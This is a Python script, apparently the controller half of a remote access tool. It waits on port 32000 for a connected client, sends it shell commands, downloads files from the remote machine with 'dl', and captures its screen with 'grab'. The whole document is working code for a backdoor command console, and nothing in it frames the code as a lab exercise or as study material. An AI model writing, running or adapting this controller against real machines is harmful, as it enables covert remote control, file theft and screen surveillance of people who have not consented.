import datetime
import socket

HOST_IP = ""
HOST_PORT = 32000
MAX_DATA_SIZE = 1024
s = socket.socket()
s.bind((HOST_IP,HOST_PORT))
s.listen()
print(f"En attente de connexion de {HOST_IP},port {HOST_PORT}...")
socket_connexion,clien_adress = s.accept()
print(f"Connexion établie avec {clien_adress}")


def socket_receive_all_data(s_connexion,len_data):
    data_receive_len = 0
    data_total = None
    while data_receive_len < len_data:
        data_remaining = len_data - data_receive_len
        if data_remaining > MAX_DATA_SIZE:
            data_remaining = MAX_DATA_SIZE
        data = s_connexion.recv(data_remaining)
        if not data:
            return None
        if not data_total:
            data_total = data
        else:
            data_total += data
        data_receive_len += len(data)
    return data_total


def send_and_receive_data(socket_connexion,commande):
    socket_connexion.sendall(commande.encode())
    head = socket_receive_all_data(socket_connexion, 13)
    header = int(head.decode())
    data_return = socket_receive_all_data(socket_connexion, header)
    return data_return

while True:
    path = send_and_receive_data(socket_connexion,"info").decode()
    commande = input(f"{clien_adress[0]},{clien_adress[1]}-{path}>")
    if commande == "":
        continue
    commande_split = commande.split(" ")
    data_return = send_and_receive_data(socket_connexion,commande)
    if not data_return:
        break
    if len(commande_split) == 2 and commande_split[0] == "dl":
        if data_return != b' ':
            f = open(commande_split[1],"wb")
            f.write(data_return)
            f.close()
            print("téléchargement terminé!")
        else:
            print("aucun fichier trouvé")
    if commande == "grab":
        filename = "_".join(str(datetime.datetime.now())[0:19].split(" "))
        filename = "_".join(filename.split(":"))+".png"
        f = open(filename,"wb")
        f.write(data_return)
        f.close()
    else:
        print(data_return.decode())

s.close()
socket_connexion.close()
print("connexion fermé avec succes")
